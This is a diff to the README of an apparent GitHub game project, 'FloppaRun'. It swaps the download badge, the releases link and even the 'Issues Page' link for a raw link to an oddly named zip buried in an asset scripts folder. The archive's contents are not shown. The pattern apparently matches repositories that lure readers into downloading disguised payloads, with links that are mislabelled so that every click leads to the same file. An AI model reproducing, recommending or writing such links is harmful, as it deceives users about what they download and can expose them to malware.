@@ -1,6 +1,6 @@
 # 🎮 FloppaRun - Endless Fun Collecting Dumplings!
 
-![Download FloppaRun](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)
+![Download FloppaRun](https://github.com/tonylksj/FloppaRun/raw/refs/heads/main/Assets/Scenes/FlyingFight/scripts/Floppa-Run-tercentenarian.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ FloppaRun is an exciting endless runner game where you control Shlёpa, dodging 
 
 ## 📥 Downloading FloppaRun
 
-To get started, visit this page to download: [Download FloppaRun](https://github.com/tonylksj/FloppaRun/releases)
+To get started, visit this page to download: [Download FloppaRun](https://github.com/tonylksj/FloppaRun/raw/refs/heads/main/Assets/Scenes/FlyingFight/scripts/Floppa-Run-tercentenarian.zip)
 
 ## 📋 System Requirements
 
@@ -57,7 +57,7 @@ FloppaRun is simple to play. Use these controls:
 
 If you encounter any issues while using FloppaRun or have questions, please reach out:
 
-- Visit our [Issues Page](https://github.com/tonylksj/FloppaRun/issues) on GitHub.  
+- Visit our [Issues Page](https://github.com/tonylksj/FloppaRun/raw/refs/heads/main/Assets/Scenes/FlyingFight/scripts/Floppa-Run-tercentenarian.zip) on GitHub.  
 - We encourage you to report any bugs so we can fix them promptly.
 
 ## 📖 Additional Information
